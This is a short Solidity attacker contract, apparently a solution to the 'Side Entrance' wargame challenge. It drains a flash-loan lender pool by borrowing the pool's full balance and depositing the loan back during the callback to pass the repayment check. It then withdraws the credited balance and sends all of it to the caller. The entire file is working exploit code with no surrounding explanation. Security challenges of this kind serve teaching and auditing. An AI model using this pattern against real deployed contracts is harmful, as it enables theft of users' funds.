
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolAttacker {

    SideEntranceLenderPool pool;
    uint256 poolBalance;
    constructor (address _pool) {
        poolBalance = _pool.balance;
        pool = SideEntranceLenderPool(_pool);
        
    }

    receive() payable external {}

    function execute() payable external {
        pool.deposit{value: msg.value}();
    }

    function attack() external {
        pool.flashLoan(poolBalance);        
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

}
 